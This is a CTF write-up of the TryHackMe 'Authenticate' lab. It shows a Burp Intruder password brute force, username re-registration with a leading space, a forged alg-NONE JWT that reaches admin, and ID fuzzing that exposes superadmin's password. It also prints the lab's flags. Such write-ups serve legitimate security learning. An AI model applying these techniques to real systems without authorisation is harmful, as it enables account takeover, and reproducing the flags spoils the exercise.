# TryHackMe: Authenticate (Writeup)

[Authenticate](https://tryhackme.com/room/authenticate) is a TryHackMe CTF.
Focusses on a few types of authentication exploitation.

## Dictionary attack

Room requires you to use Burp Suite.
Start Burp Suite.
Connect to Burp proxy.
Turn off Burp proxy intercept.
Navigate to victim host on port 8888.

```
http://10.10.87.9:8888
```

After navigating to home page, turn the proxy intercept back on.
Input some random credentials into the login form.
Capture a request.

Send the POST `/login` request to Intruder.

Manipulate the request such the username is `jack` and we identify the payload area in the password field.

```
user=jack&password=§§
```

Goto Payload tab and load in `/usr/share/wordlists/rockyou.txt` as password list.
Start the attack.

Allow attack to run.
Will see the password `12345678` returns a different response.

```
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 221
Location: http://10.10.87.9:8888/logged
Vary: Cookie
Set-Cookie: session=eyJ1c2VyX2lkIjoxfQ.X3ej_A.sdwlnIZGKBKbBYGfMCVC1DEGXkw; HttpOnly; Path=/
Server: Werkzeug/0.16.0 Python/3.6.9
Date: Fri, 02 Oct 2020 22:04:44 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/logged">/logged</a>.  If not click the link.
```
Which acknowledges a succesful login. 

Following this, we can login using the found credentials.
Which reveals the flag.

```
fad9ddc1feebd9e9bca05f02dd89e271
```

Now we can try this for user `mike`.
Though, this time I swapped out `rockyou` for `fasttrack`.
A smaller list that doesn't take a long time to load.

A successful login occurs at password payload `12345`.

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/logged">/logged</a>.  If not click the link.
```

And after logging in as `mike`, we get the second flag.

```
e1faaa144df2f24aa0a9284f4a5bb578
```

## Re-registration

This section takes advantage of an exploit where we register as a user that already exists. For example, `darren` exists, so we will register as ` darren`, with a space prefixing the username.

Once registered, login to obtain flag.
Remeber to prefix the username with a space.

```
fe86079416a21a3c99937fea8874b667
```

And lets do the same for `arthur` too.
Arthur's flag is as follows.

```
d9ac0f7db4fda460ac3edeb75d75e16e
```

## JWT

We will exploit JWT tokens in this section.

Don't do like me.
Make sure you switch to port 5000. 
I spent an hour or so trying to decode the session cookie on 8888 --.

When you get to the site _on port 5000_. You'll see an authenticate form.
Use credentials `user:user`. You'll see a popup saying 'Welcome ~'.

After this, a Session Cookie with name `session` will be stored. For example:

We can decode this in Burp.
Paste the code into Burp's Decoder.
Decode as Base64.

```
{"typ":"JWT","alg":"HS256"}.{"exp":1601679943,"iat":1601679643,"nbf":1601679643,"identity":1}.
```

Add this the Access Token in Local Storage. 
Replacing the first two sections.
Leave the last section.

Edit the identity integer. 
Hit Go.
And you'll find admin!

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0K.eyJleHAiOjE1ODY3MDUyOTUsImlhdCI6MTU4NjcwNDk5NSwibmJmIjoxNTg2NzA0OTk1LCJpZGVudGl0eSI6MH0K.
```

After hitting Go the following is returned.
```
Welcome admin: 92498880383088033228
```

## NoAuth

Switch the port 7777.

Hit _Create User_, progress to _Private space_.

The URL bar will show:
```
http://10.10.87.9:7777/users/1
```

Fuzz the integer and find `superadmin`'s password.

```
http://10.10.87.9:7777/users/0
```
```
Hello superadmin!

Your password:
abcd1234

Your secret data:
Here's your flag: 72102933396288983011
```

